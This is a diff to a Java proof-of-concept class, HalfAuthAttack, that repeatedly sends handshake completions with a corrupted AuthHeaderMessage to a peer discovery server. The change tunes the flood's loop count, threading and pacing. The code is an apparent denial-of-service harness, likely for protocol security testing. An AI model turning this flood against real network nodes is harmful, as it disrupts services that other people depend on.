@@ -29,6 +29,7 @@ import java.util.concurrent.CompletableFuture;
 import java.util.concurrent.ExecutorService;
 import java.util.concurrent.Executors;
 import java.util.concurrent.TimeUnit;
+import java.util.concurrent.locks.LockSupport;
 import java.util.function.Function;
 
 import static org.apache.commons.codec.CharEncoding.UTF_8;
@@ -39,7 +40,7 @@ public class HalfAuthAttack {
     public static final String LOCALHOST = "127.0.0.1";
     private static final Logger logger = LogManager.getLogger();
     private static List<DiscoverySystem> managers = new ArrayList<>();
-    private static ExecutorService executor = Executors.newFixedThreadPool(2);
+//    private static ExecutorService executor = Executors.newFixedThreadPool(2);
 
     public static void main(String[] args) throws Exception {
         if (args.length == 0) {
@@ -61,10 +62,11 @@ public class HalfAuthAttack {
         client.startHandshake(server).thenApply(packet -> {
             System.out.println("Got packet, sending malformed AuthHeaderMessage packets");
             AuthHeaderMessagePacket modified = corruptAuthHeader(packet);
-            for (int i = 0; i < 10000000; ++i) {
-                executor.submit(() -> {
+            for (int i = 0; i < 100000000; ++i) {
+//                executor.submit(() -> {
                 client.completeHandshake(modified, server);
-                });
+                LockSupport.parkNanos(500000);
+//                });
                 if (i % 1000 == 0) {
                     System.out.println(i + " requests sent");
                 }
